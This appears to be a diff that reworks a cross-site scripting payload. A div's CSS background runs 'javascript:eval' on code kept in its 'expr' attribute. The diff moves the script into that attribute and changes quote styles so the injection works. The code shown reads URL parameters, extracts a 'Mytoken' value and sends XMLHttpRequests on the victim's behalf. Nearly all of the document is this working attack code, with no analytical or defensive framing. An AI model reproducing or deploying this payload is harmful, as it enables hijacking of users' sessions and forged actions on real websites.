@@ -1,8 +1,5 @@
 
 <div id="mycode" style="BACKGROUND: url('javascript:eval(document.all.mycode.expr)')" expr="
-
-"/>
-
 var B = String.fromCharCode(34);
 var A = String.fromCharCode(39);
 
@@ -26,10 +23,10 @@ function getData(AU) {
 
 function getQueryParams() {
     var E = document.location.search;
-    var F = E.substring(1, E.length).split("&");
+    var F = E.substring(1, E.length).split('&');
     var AS = new Array();
     for (var O = 0; O < F.length; O++) {
-        var I = F[O].split("=");
+        var I = F[O].split('=');
         AS[I[0]] = I[1];
     }
     return AS;
@@ -105,7 +102,7 @@ function getHiddenParameter(BF, BG) {
 
 function getFromURL(BF, BG) {
     var T;
-    if (BG == "Mytoken") {
+    if (BG == 'Mytoken') {
         T = B;
     } else {
         T = '&';
@@ -230,3 +227,5 @@ function httpSend2(BH, BI, BJ, BK) {
     xmlhttp2.send(BK);
     return true;
 }
+"/>
+
